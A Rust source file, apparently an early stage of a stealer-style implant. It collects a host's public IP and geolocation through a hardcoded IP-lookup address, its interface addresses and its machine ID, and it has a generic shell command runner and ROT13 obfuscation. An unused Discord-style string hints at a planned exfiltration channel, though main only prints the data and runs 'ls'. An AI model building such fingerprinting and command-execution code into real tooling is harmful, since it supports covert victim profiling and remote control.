use std::io::Read;
use std::io::Write;
use std::net::{Shutdown, TcpStream};
use std::path::Path;
use std::process::Command;

use pnet::datalink;

/*
extern crate winreg;
use winreg::enums::HKEY_LOCAL_MACHINE;

 -> Can only be compiled in windows and mac - here is linux alternative

>> winreg = "0.10.1" - dependencie

windows -> pub fn get_hwid() -> std::string::String {
    let hive = winreg::RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("\\\\SOFTWARE\\Microsoft\\Cryptography").expect("Failed to open subkey");
    let id = hive.get_value("MachineGuid").expect("Failed to get MachineGuid");
    return id
} 



macos -> pub fn get_hwid() -> std::string::String {
    let cmd = std::process::Command::new("ioreg").arg("-rd1").arg("-c").arg("IOExpertPlatformDevice").output().expect("Failed to get HWID");
    let id = cmd.stdout.last();
    return id
}

*/

// Linux version


const NEWLINE_CHAR: &str = "\n\n";

fn exec_cmd(command: &str) -> String {
    let cmd_exec = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", command])
            .output()
            .expect("failed")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(command)
            .output()
            .expect("failed")
    };
    let output_vec = cmd_exec.stdout;
    let output: String = match String::from_utf8(output_vec) {
        Ok(v) => v,
        Err(e) => String::from("[*] ~ Error during conversion of output to string"),
    };
    return output
}


fn get_ifaces() -> String {
    let mut return_value: String = String::new();
    for iface in datalink::interfaces() {
        return_value = format!("{}{:?}", return_value, iface.ips);
    }
    return return_value
}


fn get_hwid() -> std::string::String {

    let dir_1: &str = "/var/lib/dbus/machine-id";
    let dir_2: &str = "/etc/machine-id";

    let mut id = String::new();
    let mut id_exists = Path::new(dir_1).exists();
    
    if id_exists == false {
        id_exists = Path::new(dir_2).exists();
        if id_exists == false {
            return "Could not find a hardware-id".to_string() 
        }
        let mut file = std::fs::File::open(dir_2).unwrap();
        file.read_to_string( & mut id ).unwrap();
        return id
    }
    let mut file = std::fs::File::open(dir_1).unwrap();
    file.read_to_string( & mut id ).unwrap();
    return id
}



fn get_ip(host: &str) -> String {

    let mut stream = TcpStream::connect(host).expect("failed");

    let mut http_req: String = String::new();

    let http_path = "/json/?fields=status,message,continent,country,regionName,city,zip,lat,lon,isp,mobile,proxy,hosting,reverse,query,timezone,";

    http_req.push_str(format!("GET {}  HTTP/1.1", http_path).as_str());
    http_req.push_str("\r\n");
    http_req.push_str(format!("Host: {}", host).as_str());
    http_req.push_str("\r\n");
    http_req.push_str("Connection: close");
    http_req.push_str("\r\n");
    http_req.push_str("\r\n");

    let req_bytes: &[u8] = http_req.as_bytes();

    stream
        .write_all(req_bytes)
        .expect("failed");

    let mut http_res: String = String::new();

    stream
        .read_to_string(&mut http_res)
        .expect("failed");

    stream
        .shutdown(Shutdown::Both)
        .expect("failed");

    return http_res
}

fn cypher(string: &str) -> String {
    string.chars().map(|c| {
        match c {
            'a'..='m' | 'A'..='M' => ((c as u8) + 13) as char,
            'n'..='z' | 'N'..='Z' => ((c as u8) - 13) as char,
            _ => c
        }
    }).collect()
}

fn get_data() -> String  {
    
    let dc_comment: &str = "```";

    let mut data: String = String::new();

    let public_ip: String = get_ip("208.95.112.1:80");

    let iface_list: String = get_ifaces(); //edit to use instead "ipconfig" command in windows so only standard library

    let hwid: String = get_hwid();

    data = format!("{}{}{}{}{}", public_ip, NEWLINE_CHAR, iface_list, NEWLINE_CHAR, hwid);

    return data

}

fn main() {

    let data: String = get_data();
    println!("{}", data);
    
    let output = exec_cmd("ls");
    println!("{}", output);

}
